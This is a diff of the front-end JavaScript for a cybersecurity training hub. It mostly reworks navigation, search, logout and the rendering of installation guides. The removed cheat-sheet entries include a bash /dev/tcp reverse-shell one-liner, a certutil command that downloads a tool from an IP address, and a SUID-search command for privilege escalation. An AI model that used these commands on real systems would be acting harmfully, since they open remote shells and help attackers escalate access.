-        title: "Reverse Shell One-Liners (Bash, Python, NC)",
-        badgeText: "OFFENSIVE CHEATSHEET",
-        badgeClass: "cat-cheatsheets",
-        icon: "fa-bolt",
-        desc: "Instant copy-paste reverse shell one-liners for target post-exploitation across Linux, Windows, PHP, Python, and PowerShell environments.",
-        code: "bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1",
-        tags: ["Reverse Shell", "Bash", "Netcat", "PowerShell", "Payloads"],
-        url: "https://www.revshells.com/",
-        actionText: "Launch Online Generator",
-        level: "All Levels",
-        details: "Generates URL-encoded, Base64, and obfuscated one-line shell payloads with custom IP and port configuration."
-      },
-      {
-        id: "cheat-privesc-linux",
-        category: "cheatsheets",
-        title: "Linux Privilege Escalation Checklist (LinPEAS)",
-        badgeText: "PRIVESC CHECKLIST",
-        badgeClass: "cat-cheatsheets",
-        icon: "fa-arrow-up-right-dots",
-        desc: "Rapid checklist to escalate from a low-privilege shell to root: SUID binaries, misconfigured sudoers, crontabs, and kernel exploits.",
-        code: "find / -perm -u=s -type f 2&gt;/dev/null",
-        tags: ["Privilege Escalation", "SUID", "GTFOBins", "Root Access"],
-        url: "https://gtfobins.github.io/",
-        actionText: "Browse GTFOBins",
-        level: "Intermediate",
-        details: "GTFOBins provides a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems."
-      },
-      {
-        id: "cheat-privesc-win",
-        category: "cheatsheets",
-        title: "Windows Privilege Escalation (LOLBAS)",
-        badgeText: "WINDOWS PRIVESC",
-        badgeClass: "cat-cheatsheets",
-        icon: "fa-shield-halved",
-        desc: "Living Off The Land Binaries and Scripts (LOLBAS) to execute, download, and bypass UAC using built-in signed Microsoft executables.",
-        code: "certutil -urlcache -split -f http://IP/tool.exe",
-        tags: ["Windows", "LOLBAS", "UAC Bypass", "Living Off The Land"],
-        url: "https://lolbas-project.github.io/",
-        actionText: "Browse LOLBAS Project",
-        level: "Intermediate",
-        details: "Every signed Microsoft binary that can be weaponized for persistence, credential dumping, or arbitrary command execution."
-      },
-      {
-        id: "cheat-soc-triage",
-        category: "cheatsheets",
-        title: "SOC Analyst Incident Triage Matrix",
-        badgeText: "BLUE TEAM WORKFLOW",
-        badgeClass: "cat-cheatsheets",
-        icon: "fa-list-check",
-        desc: "A rapid 5-step checklist for analyzing suspected phishing emails, IP reputation lookups, file hash detonation, and host isolation.",
-        code: "Header parsing, URL defanging, VirusTotal, Any.Run",
-        tags: ["SOC Analyst", "Phishing Triage", "Defanging", "Sandbox Detonation"],
-        url: "https://www.virustotal.com/",
-        actionText: "Open VirusTotal",
-        level: "Beginner to Intermediate",
-        details: "Quick guide for analyzing headers: check Return-Path, SPF, DKIM, DMARC, extract suspicious attachments, and defang URLs before communication."
       }
     ];
 
-    // Local State (Welcome view first on login/entry)
+    // Merge expanded external datasets from js/cyber-data.js if loaded
+    if (typeof CYBER_COURSES !== 'undefined') {
+      CYBER_COURSES.forEach(c => {
+        if (!CYBER_RESOURCES.some(r => r.id === c.id)) {
+          CYBER_RESOURCES.push({
+            id: c.id,
+            category: "videos",
+            title: c.title,
+            badgeText: c.badgeText || "MASTERCLASS",
+            badgeClass: "cat-videos",
+            icon: c.icon || "fa-play-circle",
+            desc: c.desc,
+            tags: c.tags || [],
+            url: c.actionUrl || "https://www.youtube.com/",
+            actionText: c.actionText || "Watch Masterclass",
+            level: c.level || "All Levels",
+            details: c.details || c.desc
+          });
+        }
+      });
+    }
+
+    if (typeof CYBER_TOOLS !== 'undefined') {
+      CYBER_TOOLS.forEach(t => {
+        if (!CYBER_RESOURCES.some(r => r.id === t.id)) {
+          CYBER_RESOURCES.push({
+            id: t.id,
+            category: "tools",
+            title: t.name || t.title,
+            badgeText: t.domain || t.badgeText || "TOOL",
+            badgeClass: "cat-tools",
+            icon: t.icon || "fa-wrench",
+            desc: t.desc,
+            code: t.command || t.code || "",
+            tags: t.tags || [t.domain || "Security"],
+            url: t.officialUrl || t.url || "https://github.com/",
+            actionText: t.actionText || "Tool Repository",
+            level: t.level || "All Levels",
+            details: t.details || t.usage || t.desc
+          });
+        }
+      });
+    }
+
+    if (typeof CYBER_OS !== 'undefined') {
+      CYBER_OS.forEach(o => {
+        if (!CYBER_RESOURCES.some(r => r.id === o.id)) {
+          CYBER_RESOURCES.push({
+            id: o.id,
+            category: "os",
+            title: o.name || o.title,
+            badgeText: o.type || o.badgeText || "SECURITY OS",
+            badgeClass: "cat-os",
+            icon: o.icon || "fa-desktop",
+            desc: o.desc,
+            code: o.credentials ? `Credentials: ${o.credentials.username} / ${o.credentials.password}` : (o.code || ""),
+            tags: o.tags || ["Hardened OS"],
+            url: o.officialUrl || o.url || "https://distrowatch.com/",
+            actionText: o.actionText || "Download ISO",
+            level: o.level || "All Levels",
+            details: o.details || o.desc
+          });
+        }
+      });
+    }
+
+    if (typeof CYBER_BOOKS !== 'undefined') {
+      CYBER_BOOKS.forEach(b => {
+        if (!CYBER_RESOURCES.some(r => r.id === b.id)) {
+          CYBER_RESOURCES.push({
+            id: b.id,
+            category: "books",
+            title: b.title,
+            badgeText: b.topic || b.badgeText || "REFERENCE TEXT",
+            badgeClass: "cat-books",
+            icon: b.icon || "fa-book-open",
+            desc: b.desc,
+            code: b.author ? `Author: ${b.author}` : (b.code || ""),
+            tags: b.tags || ["Cyber Security"],
+            url: b.pdfUrl || b.url || "#",
+            actionText: b.actionText || "Read / Access Book",
+            level: b.level || "All Levels",
+            details: b.details || b.desc
+          });
+        }
+      });
+    }
+
+    // Active state
     let currentCategory = "welcome";
     let searchQuery = "";
     let bookmarkedIds = JSON.parse(localStorage.getItem('cyber_hub_bookmarks')) || [];
 
-    // Enforce Login Requirement: Redirect to login page if unauthenticated
+    // Session Enforcement
     function enforceAuthGuard() {
       const sessionStr = localStorage.getItem('cyber_auth_session');
       if (!sessionStr) {
@@ -2987,13 +963,29 @@
       return null;
     }
 
-    // Terminate Session from Hub
-    function handleHubLogout() {
-      localStorage.removeItem('cyber_auth_session');
+    function handleHubLogout(e) {
+      if (e) {
+        try { e.preventDefault(); } catch (err) {}
+        try { e.stopPropagation(); } catch (err) {}
+      }
+      try {
+        localStorage.removeItem('cyber_auth_session');
+        sessionStorage.removeItem('cyber_auth_session');
+        localStorage.removeItem('cyber_session_user');
+        sessionStorage.clear();
+      } catch (err) {
+        console.error('Logout error:', err);
+      }
       window.location.href = 'index.html';
     }
+    window.handleHubLogout = handleHubLogout;
 
-    // Tab Sync Helper
+    // Defend against bfcache navigation returning without session
+    window.addEventListener('pageshow', (event) => {
+      enforceAuthGuard();
+    });
+
+    // Sync Active Navigation Tabs
     function syncActiveTabs(cat) {
       document.querySelectorAll('.hub-nav-links .nav-link').forEach(link => {
         link.classList.remove('active');
@@ -3008,169 +1000,133 @@
         const el = document.getElementById(navTarget);
         if (el) el.classList.add('active');
       }
-
-      document.querySelectorAll('.hub-filter-btn').forEach(btn => {
-        btn.classList.toggle('active', btn.dataset.category === cat);
-      });
     }
 
-    // Initialize Hub on Page Load
+    // Initialize Hub
     document.addEventListener('DOMContentLoaded', () => {
+      const logoutBtn = document.getElementById('hubLogoutBtn');
+      if (logoutBtn) {
+        logoutBtn.addEventListener('click', handleHubLogout);
+      }
+
       const activeSession = enforceAuthGuard();
       if (!activeSession) return;
 
       const pillName = document.getElementById('hubOperatorName');
       const displayName = (activeSession.name || (activeSession.mail ? activeSession.mail.split('@')[0] : 'OPERATOR')).trim();
-      if (pillName) {
-        pillName.innerText = displayName;
-      }
+      if (pillName) pillName.innerText = displayName;
 
       const welcomeBadge = document.getElementById('welcomeOperatorBadge');
-      if (welcomeBadge) {
-        welcomeBadge.innerText = displayName;
-      }
+      if (welcomeBadge) welcomeBadge.innerText = displayName;
 
-      // Check URL hash for direct category deep-linking
+      // URL Hash Routing
       const hash = window.location.hash.replace('#', '');
-      if (hash === 'welcome') {
+      if (hash === 'welcome' || !hash) {
         currentCategory = 'welcome';
       } else if (hash === 'courses') {
         currentCategory = 'videos';
       } else if (hash === 'installation-and-use' || hash === 'guides') {
         currentCategory = 'guides';
-      } else if (['videos', 'books', 'tools', 'os', 'cheatsheets', 'bookmarks'].includes(hash)) {
+      } else if (['videos', 'books', 'tools', 'os'].includes(hash)) {
         currentCategory = hash;
       } else {
         currentCategory = 'welcome';
       }
 
       syncActiveTabs(currentCategory);
-      renderResources();
-      updateCategoryCounts();
+      renderCurrentView();
     });
 
-    // Switch category from Header Nav
+    // Navigation Switcher (Top Nav Bar)
     function switchCategoryFromNav(cat, event) {
       if (event) event.preventDefault();
       currentCategory = cat;
 
-      syncActiveTabs(cat);
-      renderResources();
-
-      if (cat === 'welcome') {
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      } else {
-        const controlsBar = document.querySelector('.hub-controls-bar');
-        if (controlsBar) {
-          controlsBar.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
-      }
-    }
-
-    // Filter by Category Button
-    function filterCategory(cat, btnEl) {
-      currentCategory = cat;
-      syncActiveTabs(cat);
-      renderResources();
-      if (cat === 'welcome') {
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-    }
-
-    // Update Counts inside Tabs
-    function updateCategoryCounts() {
-      const setVal = (id, val) => {
-        const el = document.getElementById(id);
-        if (el) el.innerText = val;
+      // Update Hash without jumping
+      const hashMap = {
+        welcome: '#welcome',
+        videos: '#courses',
+        books: '#books',
+        tools: '#tools',
+        os: '#os',
+        guides: '#installation-and-use'
       };
-
-      setVal('countTools', CYBER_RESOURCES.filter(r => r.category === 'tools').length);
-      setVal('countOs', CYBER_RESOURCES.filter(r => r.category === 'os').length);
-      setVal('countBooks', CYBER_RESOURCES.filter(r => r.category === 'books').length);
-      setVal('countVideos', CYBER_RESOURCES.filter(r => r.category === 'videos').length);
-      setVal('countCheatsheets', CYBER_RESOURCES.filter(r => r.category === 'cheatsheets').length);
-      setVal('countBookmarks', bookmarkedIds.length);
-
-      if (typeof CYBER_GUIDES !== 'undefined') {
-        setVal('countGuides', CYBER_GUIDES.length);
+      if (hashMap[cat]) {
+        history.pushState(null, '', hashMap[cat]);
       }
+
+      syncActiveTabs(cat);
+      renderCurrentView();
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // Live Search Handler
+    // Search Input Listener
     function handleSearchChange() {
       const input = document.getElementById('hubSearchInput');
-      searchQuery = input.value.trim().toLowerCase();
-      renderResources();
-    }
-
-    // Quick suggestion click helper
-    function searchGuideSuggestion(query) {
-      const input = document.getElementById('hubSearchInput');
       if (input) {
-        input.value = query;
-        searchQuery = query.toLowerCase();
-        renderResources();
-        const controlsBar = document.querySelector('.hub-controls-bar');
-        if (controlsBar) {
-          controlsBar.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
+        searchQuery = input.value.trim().toLowerCase();
+        renderCurrentView();
       }
     }
 
-    // Active Guide Modal State
-    let currentActiveGuide = null;
-    let currentActiveGuideTab = 'specs';
+    // Filter by Specialization Track (Redirect or set category if needed, or informational)
+    function filterByTrack(track) {
+      // In the new informational architecture, track details are cleanly presented in HQ.
+      // Specific resource assets are indexed in the dedicated top navigation bar categories.
+    }
+    window.filterByTrack = filterByTrack;
 
-    // Render Cards Grid (Handles Resources, Dedicated Guides Console & Integrated Process Search)
-    function renderResources() {
+    // Render Current View
+    function renderCurrentView() {
       const welcomePanel = document.getElementById('hubWelcomePanel');
       const controlsBar = document.getElementById('hubControlsBar');
       const grid = document.getElementById('hubGrid');
-      const countEl = document.getElementById('hubResultsCount');
       const sectionBadge = document.getElementById('hubSectionBadge');
+      const countEl = document.getElementById('hubResultsCount');
+      const searchInput = document.getElementById('hubSearchInput');
 
-      // Case 0: Pure Welcome View (No study material dump; purely welcome and detailed offerings)
+      // 1. Academy HQ Welcome View:
+      // STRICTLY INFORMATIONAL (What we provide & details). ZERO links to courses, tools, books, OS, or PDFs here.
+      // All actual assets are organized in the separate top navigation bar items.
       if (currentCategory === 'welcome') {
-        if (welcomePanel) welcomePanel.style.display = 'block';
+        if (welcomePanel) welcomePanel.style.display = 'flex';
         if (controlsBar) controlsBar.style.display = 'none';
-        if (grid) grid.style.display = 'none';
+        if (grid) {
+          grid.style.display = 'none';
+          grid.innerHTML = '';
+        }
         return;
       }
 
-      // For all other categories: Hide welcome panel and display controls and materials grid
+      // 2. Specific Repository Categories (Courses, Books, Tools, OS, Guides)
       if (welcomePanel) welcomePanel.style.display = 'none';
       if (controlsBar) controlsBar.style.display = 'block';
       if (grid) grid.style.display = 'grid';
 
       const sectionLabels = {
-        videos: 'COURSES & VIDEO MASTERCLASSES',
-        books: 'BOOKS & PDF VAULT',
+        videos: 'COURSES & MASTERCLASSES',
+        books: 'BOOKS & REFERENCE MANUALS',
         tools: 'SECURITY TOOLS ARSENAL',
-        os: 'SECURITY OPERATING SYSTEMS',
-        cheatsheets: 'COMMAND CHEAT SHEETS',
-        bookmarks: 'SAVED BOOKMARKS',
-        guides: 'INSTALLATION & USE PROCESS GUIDES'
+        os: 'HARDENED OPERATING SYSTEMS',
+        guides: 'INSTALLATION & DEPLOYMENT GUIDES'
       };
       if (sectionBadge) {
         sectionBadge.innerText = sectionLabels[currentCategory] || currentCategory.toUpperCase();
       }
+      if (searchInput && !searchQuery) {
+        searchInput.placeholder = `Search within ${sectionLabels[currentCategory] || 'this section'}...`;
+      }
 
-      // Case 1: Dedicated Installation & Use View
+      // Case: Installation Guides View
       if (currentCategory === 'guides') {
         renderGuidesConsole(grid, countEl);
         return;
       }
 
-      // Case 2: Specific Filtered Category
-      let filtered = CYBER_RESOURCES;
+      // Normal Categories (Courses, Books, Tools, OS)
+      let filtered = CYBER_RESOURCES.filter(r => r.category === currentCategory);
 
-      if (currentCategory === 'bookmarks') {
-        filtered = filtered.filter(r => bookmarkedIds.includes(r.id));
-      } else {
-        filtered = filtered.filter(r => r.category === currentCategory);
-      }
-
-      // Search query filter for resources
       if (searchQuery) {
         filtered = filtered.filter(r => {
           return (
@@ -3182,56 +1138,22 @@
         });
       }
 
-      // Integrated Guide Search: Check if search query matches installation/usage guides
-      let matchingGuidesHtml = '';
-      if (searchQuery && typeof searchCyberGuides === 'function') {
-        const matchingGuides = searchCyberGuides(searchQuery);
-        if (matchingGuides.length > 0) {
-          matchingGuidesHtml = `
-            <div style="grid-column: 1 / -1; background: linear-gradient(135deg, rgba(255, 0, 56, 0.12) 0%, rgba(13, 17, 23, 0.95) 100%); border: 1px solid var(--crimson-primary); border-radius: var(--radius-md); padding: 18px 22px; margin-bottom: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6), 0 0 16px var(--crimson-glow);">
-              <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; margin-bottom: 12px;">
-                <div style="display: flex; align-items: center; gap: 10px;">
-                  <i class="fa-solid fa-screwdriver-wrench" style="font-size: 20px; color: var(--crimson-light);"></i>
-                  <span style="font-family: var(--font-mono); font-size: 13px; font-weight: 700; color: #fff; text-transform: uppercase;">
-                    Installation &amp; Usage Process Guide Available (${matchingGuides.length})
-                  </span>
-                </div>
-                <button class="btn btn-primary" onclick="filterCategory('guides')" style="font-size: 11px; padding: 6px 14px; font-family: var(--font-mono); text-transform: uppercase;">
-                  Open Installation Guides
-                </button>
-              </div>
-              <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                ${matchingGuides.map(g => `
-                  <button type="button" onclick="openGuideModal('${g.id}')" style="background: rgba(0,0,0,0.6); border: 1px solid rgba(255, 0, 56, 0.4); border-radius: 6px; padding: 8px 14px; color: #fff; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 12px; transition: var(--transition);" onmouseover="this.style.borderColor='var(--crimson-light)'; this.style.transform='translateY(-1px)';" onmouseout="this.style.borderColor='rgba(255, 0, 56, 0.4)'; this.style.transform='translateY(0)';">
-                    <i class="fa-solid ${g.icon}" style="color: var(--crimson-light);"></i>
-                    <strong>${g.target}:</strong> ${g.title}
-                    <span style="font-size: 10px; background: rgba(255, 0, 56, 0.2); color: var(--crimson-light); padding: 2px 6px; border-radius: 3px;">PROCESS READY &rarr;</span>
-                  </button>
-                `).join('')}
-              </div>
-            </div>
-          `;
+      if (countEl) {
+        if (currentCategory === 'welcome') {
+          countEl.innerText = `Displaying ${filtered.length} verified assets across all categories`;
+        } else {
+          countEl.innerText = `Showing ${filtered.length} verified items in this section`;
         }
       }
 
-      countEl.innerText = `Displaying ${filtered.length} verified items in this section`;
-
-      if (filtered.length === 0 && !matchingGuidesHtml) {
+      if (filtered.length === 0) {
         grid.innerHTML = `
           <div style="grid-column: 1 / -1; text-align: center; padding: 60px 20px; background: var(--bg-card); border: 1px dashed var(--border-card); border-radius: var(--radius-lg);">
-            <i class="fa-solid fa-folder-open" style="font-size: 42px; color: var(--text-muted); margin-bottom: 16px;"></i>
-            <h3 style="font-size: 20px; color: #fff; margin-bottom: 8px;">No matching assets found in this section</h3>
-            <p style="color: var(--text-secondary); max-width: 440px; margin: 0 auto 20px;">
-              Looking for step-by-step procedures (e.g. how to install kali linux on vmware)? Check the Installation &amp; Use section on the right.
+            <i class="fa-solid fa-magnifying-glass" style="font-size: 38px; color: var(--text-muted); margin-bottom: 14px;"></i>
+            <h3 style="font-size: 19px; color: #fff; margin-bottom: 8px;">No matching assets found</h3>
+            <p style="color: var(--text-secondary); max-width: 440px; margin: 0 auto;">
+              Try clearing your search query or check other sections from the top navigation bar.
             </p>
-            <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
-              <button class="hub-btn-action hub-btn-primary" onclick="filterCategory('guides')" style="display: inline-flex; width: auto; padding: 10px 20px;">
-                <i class="fa-solid fa-screwdriver-wrench"></i> Open Installation &amp; Use
-              </button>
-              <button class="hub-btn-action hub-btn-secondary" onclick="filterCategory('videos')" style="display: inline-flex; width: auto; padding: 10px 20px;">
-                <i class="fa-solid fa-play-circle"></i> Browse Courses
-              </button>
-            </div>
           </div>
         `;
         return;
@@ -3241,32 +1163,26 @@
         const isBookmarked = bookmarkedIds.includes(item.id);
         const tagsHtml = item.tags.map(t => `<span class="hub-tag-pill">${t}</span>`).join('');
 
-        // Customized Category Presentation
-        let catSpecificBanner = '';
-        let primaryBtnIcon = 'fa-arrow-up-right-from-square';
-        let primaryBtnLabel = item.actionText || 'Open Resource';
-        let secondaryBtnLabel = 'Details';
+        let primaryIcon = 'fa-arrow-up-right-from-square';
+        let primaryLabel = item.actionText || 'Open Resource';
+        let secondaryLabel = 'Details';
 
         if (item.category === 'videos') {
-          catSpecificBanner = `<div style="font-family: var(--font-mono); font-size: 10px; color: #c084fc; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;"><i class="fa-solid fa-play-circle"></i> PRACTICAL VIDEO MASTERCLASS &bull; ${item.level}</div>`;
-          primaryBtnIcon = 'fa-play';
-          primaryBtnLabel = item.actionText || 'Watch Masterclass';
-          secondaryBtnLabel = 'Course Syllabus';
+          primaryIcon = 'fa-play';
+          primaryLabel = item.actionText || 'Watch Masterclass';
+          secondaryLabel = 'Syllabus';
         } else if (item.category === 'books') {
-          catSpecificBanner = `<div style="font-family: var(--font-mono); font-size: 10px; color: #60a5fa; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;"><i class="fa-solid fa-book-bookmark"></i> STANDARD REFERENCE TEXT &bull; ${item.level}</div>`;
-          primaryBtnIcon = 'fa-book-open';
-          primaryBtnLabel = item.actionText || 'Read / Access PDF';
-          secondaryBtnLabel = 'Book Index';
+          primaryIcon = 'fa-book-open';
+          primaryLabel = item.actionText || 'Read / Access PDF';
+          secondaryLabel = 'Book Index';
         } else if (item.category === 'tools') {
-          catSpecificBanner = `<div style="font-family: var(--font-mono); font-size: 10px; color: #f87171; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;"><i class="fa-solid fa-wrench"></i> SECURITY UTILITY &bull; ${item.level}</div>`;
-          primaryBtnIcon = 'fa-download';
-          primaryBtnLabel = item.actionText || 'Download / Repo';
-          secondaryBtnLabel = 'Field Briefing';
+          primaryIcon = 'fa-download';
+          primaryLabel = item.actionText || 'Download / Repo';
+          secondaryLabel = 'Field Briefing';
         } else if (item.category === 'os') {
-          catSpecificBanner = `<div style="font-family: var(--font-mono); font-size: 10px; color: #34d399; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;"><i class="fa-solid fa-desktop"></i> OFFENSIVE DISTRO &bull; ${item.level}</div>`;
-          primaryBtnIcon = 'fa-download';
-          primaryBtnLabel = item.actionText || 'Download Official ISO';
-          secondaryBtnLabel = 'Hardware Specs';
+          primaryIcon = 'fa-download';
+          primaryLabel = item.actionText || 'Download Official ISO';
+          secondaryLabel = 'Specs & Credentials';
         }
 
         return `
@@ -3286,8 +1202,6 @@
                 </button>
               </div>
 
-              ${catSpecificBanner}
-
               <h2 class="hub-card-title">
                 ${item.title}
               </h2>
@@ -3297,9 +1211,9 @@
               </p>
 
               ${item.code ? `
-                <div class="hub-code-preview" title="Quick reference / command">
+                <div class="hub-code-preview" title="Command reference">
                   <span>${item.code}</span>
-                  <button class="hub-copy-inline-btn" onclick="copySnippet('${escapeQuotes(item.code)}')" title="Copy Command">
+                  <button class="hub-copy-inline-btn" onclick="copySnippet('${escapeQuotes(item.code)}')" title="Copy">
                     <i class="fa-regular fa-copy"></i>
                   </button>
                 </div>
@@ -3312,22 +1226,22 @@
 
             <div class="hub-card-actions">
               <a href="${item.url}" target="_blank" rel="noopener noreferrer" class="hub-btn-action hub-btn-primary">
-                <i class="fa-solid ${primaryBtnIcon}"></i>
-                <span>${primaryBtnLabel}</span>
+                <i class="fa-solid ${primaryIcon}"></i>
+                <span>${primaryLabel}</span>
               </a>
               <button type="button" class="hub-btn-action hub-btn-secondary" onclick="openResourceModal('${item.id}')">
                 <i class="fa-solid fa-circle-info"></i>
-                <span>${secondaryBtnLabel}</span>
+                <span>${secondaryLabel}</span>
               </button>
             </div>
           </article>
         `;
       }).join('');
 
-      grid.innerHTML = matchingGuidesHtml + cardsHtml;
+      grid.innerHTML = cardsHtml;
     }
 
-    // Dedicated Installation & Use Console Renderer
+    // Guides Console Renderer
     function renderGuidesConsole(grid, countEl) {
       let guidesList = (typeof CYBER_GUIDES !== 'undefined') ? CYBER_GUIDES : [];
 
@@ -3335,15 +1249,16 @@
         guidesList = searchCyberGuides(searchQuery);
       }
 
-      countEl.innerText = `Showing ${guidesList.length} comprehensive installation & practical usage process guides`;
+      if (countEl) {
+        countEl.innerText = `Showing ${guidesList.length} verified installation & practical guides`;
+      }
 
-      // Guides Hero & Quick Search Chips Banner
       const bannerHtml = `
         <div class="guides-hero-banner" style="grid-column: 1 / -1;">
           <div class="guides-hero-header">
             <div>
               <div style="font-family: var(--font-mono); font-size: 11px; color: var(--crimson-light); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 4px;">
-                <i class="fa-solid fa-screwdriver-wrench"></i> DEPLOYMENT &amp; OPERATIONAL HOW-TO GUIDES
+                <i class="fa-solid fa-screwdriver-wrench"></i> DEPLOYMENT PROCESS REPOSITORY
               </div>
               <h2 style="font-size: 22px; color: #fff; margin: 0;">
                 OS &amp; Security Tools: Installation, Virtualization &amp; Practical Use
@@ -3354,13 +1269,12 @@
             </div>
           </div>
           <p style="font-size: 13.5px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 12px; max-width: 860px;">
-            Learn how to deploy any security tool or operating system step-by-step. Click or type any search query (such as <em>"how to install kali linux on vmware"</em> or <em>"how to use parrot os"</em>) — find comprehensive procedural walkthroughs, BIOS virtualization flags, default credentials, and first-boot terminal commands here.
+            Step-by-step procedural blueprints for installing and running cyber security operating systems and tools. Complete with BIOS virtualization flags, default credentials, and first-boot commands.
           </p>
 
-          <!-- Quick Query Search Suggestions -->
           <div style="margin-top: 14px;">
             <div style="font-family: var(--font-mono); font-size: 10.5px; color: var(--text-muted); text-transform: uppercase; margin-bottom: 6px;">
-              // QUICK SEARCH SHORTCUTS (CLICK TO TEST):
+              // QUICK SEARCH PROCEDURES:
             </div>
             <div class="guides-quick-chips">
               <span class="guide-chip" onclick="searchGuideSuggestion('how to install kali linux on vmware')">
@@ -3381,12 +1295,6 @@
               <span class="guide-chip" onclick="searchGuideSuggestion('how to install metasploit')">
                 <i class="fa-solid fa-skull-crossbones text-crimson"></i> how to install metasploit
               </span>
-              <span class="guide-chip" onclick="searchGuideSuggestion('how to use wireshark')">
-                <i class="fa-solid fa-chart-line text-crimson"></i> how to use wireshark
-              </span>
-              <span class="guide-chip" onclick="searchGuideSuggestion('docker security lab')">
-                <i class="fa-brands fa-docker text-crimson"></i> docker security lab
-              </span>
             </div>
           </div>
         </div>
@@ -3398,11 +1306,8 @@
             <i class="fa-solid fa-circle-question" style="font-size: 40px; color: var(--text-muted); margin-bottom: 14px;"></i>
             <h3 style="font-size: 19px; color: #fff; margin-bottom: 8px;">No matching installation process guide found</h3>
             <p style="color: var(--text-secondary); max-width: 440px; margin: 0 auto 16px;">
-              Try searching "Kali Linux", "Parrot", "Metasploit", "Nmap", "Burp Suite", or "VirtualBox".
+              Try searching "Kali Linux", "Parrot", "Metasploit", "Nmap", or "VirtualBox".
             </p>
-            <button class="hub-btn-action hub-btn-primary" onclick="clearFilters()" style="display: inline-flex; width: auto; padding: 8px 20px;">
-              Reset Search Filter
-            </button>
           </div>
         `;
         return;
@@ -3434,7 +1339,6 @@
                 ${guide.shortDesc}
               </p>
 
-              <!-- Supported Platforms -->
               <div style="margin-bottom: 8px;">
                 <div style="font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); text-transform: uppercase;">
                   // SUPPORTED PLATFORMS:
@@ -3444,18 +1348,17 @@
                 </div>
               </div>
 
-              <!-- Hardware Specs Preview -->
               <div class="guide-specs-box">
                 <div><span>RAM:</span> <strong style="color: #fff;">${guide.specs.minRam}</strong></div>
                 <div><span>CPU:</span> <strong style="color: #fff;">${guide.specs.cpuCores}</strong></div>
                 <div><span>Disk:</span> <strong style="color: #fff;">${guide.specs.diskSpace}</strong></div>
-                <div><span>VT-x:</span> <strong style="color: #10b981;">Required in BIOS</strong></div>
+                <div><span>VT-x:</span> <strong style="color: #10b981;">BIOS Enabled</strong></div>
               </div>
 
               ${guide.firstBoot && guide.firstBoot.credentials ? `
                 <div style="background: rgba(255, 0, 56, 0.08); border: 1px solid rgba(255, 0, 56, 0.25); border-radius: 4px; padding: 6px 10px; font-family: var(--font-mono); font-size: 11px; color: var(--text-secondary); margin-bottom: 14px; display: flex; align-items: center; justify-content: space-between;">
                   <span><i class="fa-solid fa-key text-crimson"></i> Default: <strong style="color: #fff;">${guide.firstBoot.credentials.username} / ${guide.firstBoot.credentials.password}</strong></span>
-                  <span style="font-size: 9.5px; color: var(--crimson-light); text-transform: uppercase;">VERIFIED CREDENTIALS</span>
+                  <span style="font-size: 9.5px; color: var(--crimson-light); text-transform: uppercase;">VERIFIED</span>
                 </div>
               ` : ''}
             </div>
@@ -3473,7 +1376,19 @@
       grid.innerHTML = bannerHtml + cardsHtml;
     }
 
-    // Open Interactive Multi-Platform Guide Modal
+    function searchGuideSuggestion(query) {
+      const input = document.getElementById('hubSearchInput');
+      if (input) {
+        input.value = query;
+        searchQuery = query.toLowerCase();
+        renderCurrentView();
+      }
+    }
+
+    // Modal Handlers
+    let currentActiveGuide = null;
+    let currentActiveGuideTab = 'specs';
+
     function openGuideModal(guideId, tabKey = 'specs') {
       const guide = (typeof CYBER_GUIDES !== 'undefined') ? CYBER_GUIDES.find(g => g.id === guideId) : null;
       if (!guide) return;
@@ -3490,7 +1405,6 @@
       document.getElementById('hubModalOverlay').classList.add('active');
     }
 
-    // Switch Tab inside Guide Modal
     function switchGuideTab(tabKey) {
       if (!currentActiveGuide) return;
       currentActiveGuideTab = tabKey;
@@ -3498,9 +1412,7 @@
       renderGuideModalContent(modalContent, currentActiveGuide, tabKey);
     }
 
-    // Render Guide Modal Tabs & Steps
     function renderGuideModalContent(container, guide, activeTab) {
-      // Build tab buttons dynamically based on available guide sections
       const availableTabs = [
         { key: 'specs', label: 'Requirements & Specs', icon: 'fa-microchip' }
       ];
@@ -3515,7 +1427,7 @@
         availableTabs.push({ key: 'wsl2', label: 'Windows WSL2', icon: 'fa-windows' });
       }
       if (guide.installProcesses && guide.installProcesses.baremetal) {
-        availableTabs.push({ key: 'baremetal', label: 'Bare Metal / Dual Boot', icon: 'fa-hard-drive' });
+        availableTabs.push({ key: 'baremetal', label: 'Bare Metal', icon: 'fa-hard-drive' });
       }
       if (guide.firstBoot) {
         availableTabs.push({ key: 'firstboot', label: 'First Boot & Passwords', icon: 'fa-key' });
@@ -3536,7 +1448,6 @@
 
       let tabBodyHtml = '';
 
-      // Tab 1: Specs & Overview
       if (activeTab === 'specs') {
         tabBodyHtml = `
           <div style="background: rgba(0,0,0,0.5); border: 1px solid var(--border-card); border-radius: var(--radius-md); padding: 20px; margin-bottom: 20px;">
@@ -3546,7 +1457,7 @@
             <p style="font-size: 14px; color: var(--text-primary); line-height: 1.6; margin-bottom: 14px;">
               ${guide.overview}
             </p>
-            <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px;">
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
               <a href="${guide.officialUrl}" target="_blank" rel="noopener noreferrer" class="btn btn-primary" style="font-size: 11.5px; padding: 7px 16px; font-family: var(--font-mono);">
                 <i class="fa-solid fa-arrow-up-right-from-square"></i> Official Download Page
               </a>
@@ -3554,7 +1465,7 @@
           </div>
 
           <h3 style="font-size: 15px; color: #fff; margin-bottom: 12px; font-family: var(--font-mono);">
-            // MINIMUM &amp; RECOMMENDED SYSTEM REQUIREMENTS:
+            // SYSTEM REQUIREMENTS:
           </h3>
